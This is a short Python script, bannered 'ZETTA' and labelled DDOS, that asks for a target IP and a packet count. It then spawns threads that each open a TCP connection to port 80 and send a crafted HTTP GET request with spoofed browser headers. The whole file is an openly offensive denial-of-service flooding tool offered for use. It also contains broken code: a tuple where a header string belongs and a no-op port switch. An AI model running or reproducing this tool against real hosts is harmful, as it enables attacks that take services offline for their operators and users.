# ZETTA
# v0.0.2

import socket
import threading
from colorama import Fore as F


class Zetta:
    def __init__(self, ip):
        self.count = 0
        self.ip = ip
        self.agent = f"User-Agent: Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1", "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1\r\n"
        self.accept = "Accept-Encoding: gzip, deflate"
        self.reffer = f"Referer: https://duckduckgo.com/?q= {self.ip}\r\n"
        self.content = "Content-Type: application/x-www-form-urlencoded\r\n"
        self.length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        self.target_host = f"GET / HTTP/1.1\r\nHost: {self.ip}:80\r\n"
        self.main_req = f"{self.target_host} {self.agent} {self.accept} {self.reffer} {self.content} {self.length}\r\n"
        self.r = F.RED
        self.g = F.GREEN
        self.y = F.YELLOW
        self.re = F.RESET
        self.port = 80

    def send(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, self.port))
            s.send(str.encode(self.main_req))
            self.count += 1
            print(f"{self.g}[+]{self.re} Sent packet {self.count}")

        except Exception as e:
            if self.port == 80:
                self.port == 443
                self.target_host = f"GET / HTTP/1.1\r\nHost: {self.ip}:{self.port}\r\n"

            print(f"{self.r}[-]{self.re} Didn't send packet. Error: {e}")

print(f"{F.BLUE}╔════╗╔═══╗╔════╗╔════╗╔═══╗")
print('╚══╗ ║║╔══╝║╔╗╔╗║║╔╗╔╗║║╔═╗║')
print('  ╔╝╔╝║╚══╗╚╝║║╚╝╚╝║║╚╝║║ ║║')
print(' ╔╝╔╝ ║╔══╝  ║║    ║║  ║╚═╝║')
print('╔╝ ╚═╗║╚══╗ ╔╝╚╗  ╔╝╚╗ ║╔═╗║')
print('╚════╝╚═══╝ ╚══╝  ╚══╝ ╚╝ ╚╝')
print(f"{F.CYAN}------------DDOS------------")

def main():
    ip = str(input(f"{F.YELLOW}[?]{F.RESET} Target: "))
    pack = int(input(f"{F.YELLOW}[?]{F.RESET} Packet/s: "))
    zetta = Zetta(ip)

    for _ in range(pack):
        t = threading.Thread(target=zetta.send)
        t.start()


if __name__ == "__main__":
    main()
